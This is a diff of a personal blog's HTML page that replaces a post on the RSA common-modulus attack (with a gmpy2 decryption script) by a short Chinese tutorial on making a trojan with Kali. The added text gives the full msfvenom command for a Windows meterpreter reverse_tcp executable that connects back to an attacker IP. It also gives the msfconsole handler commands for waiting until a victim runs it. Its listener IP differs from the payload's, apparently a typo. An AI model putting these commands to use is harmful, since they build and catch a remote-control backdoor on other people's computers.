@@ -22,7 +22,7 @@
 
   
 
-  <title>RSA共模攻击和gmpy2、libnum常用函数 | HappyCoder&#39;Home</title>
+  <title>kali渗透工具制作木马病毒 | HappyCoder&#39;Home</title>
 
   
 
@@ -97,18 +97,16 @@
     <div class="header-content">
       <div class="post-text layout-block">
         <div class="layout-margin">
-          <h1 class="title-wrap">RSA共模攻击和gmpy2、libnum常用函数</h1>
+          <h1 class="title-wrap">kali渗透工具制作木马病毒</h1>
           <h2 class="title-sub-wrap">
             <strong>zhangkaibin</strong>
             <span>发布于</span>
-            <time  class="article-date" datetime="2022-01-10T07:55:23.000Z" itemprop="datePublished">2022-01-10</time>
+            <time  class="article-date" datetime="2022-01-12T10:32:55.000Z" itemprop="datePublished">2022-01-12</time>
           </h2>
           <ul class="wrap-list dark">
   
 </ul>
           <ul class="wrap-list dark">
-  
-    <li><a href="/tags/Crypto/">🏷️ Crypto</a></li>
   
 </ul>
         </div>
@@ -132,63 +130,37 @@
       
       
       <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
-        <h2 id="攻击条件"><a href="#攻击条件" class="headerlink" title="攻击条件"></a>攻击条件</h2><p>当两个用户使用相同的模数N、不同的私钥时，加密同一明文消息时，即存在同模攻击</p>
-<h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>设两个用户的公钥分别为e<sub>1</sub>和e<sub>2</sub>，且两者互质。明文信息为m，密文分别为:</p>
+        <h2 id="1、msfvenom生成远控木马"><a href="#1、msfvenom生成远控木马" class="headerlink" title="1、msfvenom生成远控木马"></a>1、msfvenom生成远控木马</h2><p>msfvenom是用来生成后门软件，在目标机上执行后门，在本地监听上线。(msfvenom在shell里使用，不是在msfconsole终端)</p>
 
     <figure class="figure-image">
-      <img src="/picture/c2.png" alt="" loading="lazy" />
+      <img src="/picture/misc22.png" alt="" loading="lazy" />
+      <figcaption></figcaption>
+    </figure>
+      
+<p>msfvenom  -p  windows/x64/meterpreter/reverse_tcp  lhost=192.168.88.123   lport=9999  -f  exe  -o   demo.exe<br>lhost攻击机的地址，lport：1~65535自己任选，不要选已在工作中的端口    </p>
+<p>查询kali的ip地址<br>ifconfig或ip add</p>
+
+    <figure class="figure-image">
+      <img src="/picture/misc23.png" alt="" loading="lazy" />
       <figcaption></figcaption>
     </figure>
   
 
-<p>​    </p>
-<p>当攻击者截获c<sub>1</sub>和c<sub>2</sub>后，就可以恢复出明文。用扩展欧几里得算法求出se<sub>1</sub>+te<sub>2</sub>=1 mod  n 的两个整数r和s，由此可得:</p>
 
     <figure class="figure-image">
-      <img src="/picture/c3.png" alt="" loading="lazy" />
-      <figcaption></figcaption>
-    </figure>
-                                        
-
-<p>​                                </p>
-<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2>
-    <figure class="figure-image">
-      <img src="/picture/c1.png" alt="" loading="lazy" />
+      <img src="/picture/misc24.png" alt="" loading="lazy" />
       <figcaption></figcaption>
     </figure>
   
+<p>现在木马就生成好了</p>
 
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#数字n、c1、c2都太长了，我直接去了</span><br>n=<br>e1= <span class="hljs-number">2333</span><br>e2= <span class="hljs-number">23333</span><br>c1=<br>c2=<br>gcd, s, t = gmpy2.gcdext(e1, e2)<br><span class="hljs-comment">#广义欧几里得求出s,t  gcdext返回值为e1,e2最大公因数和s、t。 s*e1+t*e2=(e1,e2)</span><br><br><span class="hljs-comment">#s和t中必然有一位负数，将其变为正数，要使等式仍然成立，取逆元</span><br><span class="hljs-keyword">if</span> s &lt; <span class="hljs-number">0</span>:<br>    s = -s<br>    c1 = gmpy2.invert(c1, n)<br><span class="hljs-keyword">if</span> t &lt; <span class="hljs-number">0</span>:<br>    t = -t<br>    c2 = gmpy2.invert(c2, n)<br>plain = gmpy2.powmod(c1, s, n) * gmpy2.powmod(c2, t, n) % n<br><span class="hljs-built_in">print</span>(long_to_bytes(plain))<br><span class="hljs-comment">#将long转换成字符串，是Crypto.Util.number中的方法，这里用不了libnum.n2s(plain)因为plain太长了</span><br></code></pre></td></tr></table></figure>
-
-<h2 id="gmpy2常用函数"><a href="#gmpy2常用函数" class="headerlink" title="gmpy2常用函数"></a>gmpy2常用函数</h2><ul>
-<li>n=invert(m,phi)求mod phi的逆元 </li>
-<li>pow(m,e,n)求c^d mod n </li>
-<li>gmpy2.is_prime(n) 素性检测</li>
-<li>gmpy2.gcd(a,b)  欧几里得算法，最大公约数 </li>
-<li>gmpy2.gcdext(a,b)  扩展欧几里得算法</li>
-<li>gmpy2.iroot(x,n)  x开n次根</li>
-<li>gmpy2.mpz(n) 初始化一个大整数</li>
-</ul>
-<h2 id="libnum常用函数"><a href="#libnum常用函数" class="headerlink" title="libnum常用函数"></a>libnum常用函数</h2><ul>
-<li>数字型（不论是十六进制还是十进制）与字符串之间的转换：</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum<br>s=<span class="hljs-string">&quot;flag&#123;pcat&#125;&quot;</span><br><span class="hljs-built_in">print</span> libnum.s2n(s)<br><br><br><span class="hljs-keyword">import</span> libnum<br>n=<span class="hljs-number">0x666c61677b706361747d</span><br><span class="hljs-built_in">print</span> libnum.n2s(n)<br></code></pre></td></tr></table></figure>
-
-<ul>
-<li> 二进制与字符串之间的转换：</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum<br>b=‘01110000011000110110000101110100‘<br><span class="hljs-built_in">print</span> libnum.b2s(b)<br><span class="hljs-comment">#二进制的位数最好是8的倍数</span><br><br><br><span class="hljs-keyword">import</span> libnum<br>b=‘01110000011000110110000101110100‘<br><span class="hljs-built_in">print</span> libnum.b2s(b)<br><span class="hljs-comment">#二进制的位数最好是8的倍数</span><br></code></pre></td></tr></table></figure>
-
-<ul>
-<li>质数&amp;因数分解</li>
-</ul>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">print</span> libnum.generate_prime(1024)<br><br><span class="hljs-builtin-name">print</span> libnum.factorize(1024)<br></code></pre></td></tr></table></figure>
-
-
-
-<blockquote>
-<p>本篇博客大部分摘自CTFwiki，记录的目的是为了加深自己的理解，也是为了方便自己的使用</p>
-</blockquote>
+    <figure class="figure-image">
+      <img src="/picture/misc25.png" alt="" loading="lazy" />
+      <figcaption></figcaption>
+    </figure>
+  
+<p>再点击open folder就可以看到demo.exe了</p>
+<h2 id="2、开启监听"><a href="#2、开启监听" class="headerlink" title="2、开启监听"></a>2、开启监听</h2><p>在msfconsole中开启监听，等待受害者运行上钩<br>use exploit/multi/handler<br>set payload windows/x64/meterpreter/reverse_tcp<br>set lhost 192.169.88.123  (注意空格不要多输)<br>set lport 9999<br>run</p>
 
       </section>
 
@@ -196,28 +168,14 @@
       
         <nav class="article-nav">
           
-            <div class="article-nav-item layout-padding">
-  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
-    
-    <div class="card-text">
-      
-        <a href="/2022/01/11/SQL%E6%B3%A8%E5%85%A5/" itemprop="url">
-          <h2 class="card-text--title text-ellipsis">SQL注入</h2>
-        </a>
-      
-      <div class="card-text--row">Newer</div>
-    </div>
-  </article>
-</div>
-          
           
             <div class="article-nav-item layout-padding">
   <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
     
     <div class="card-text">
       
-        <a href="/2022/01/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CsimpleRAR/" itemprop="url">
-          <h2 class="card-text--title text-ellipsis">攻防世界simpleRAR</h2>
+        <a href="/2022/01/11/misc%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">misc攻防世界刷题</h2>
         </a>
       
       <div class="card-text--row">Older</div>
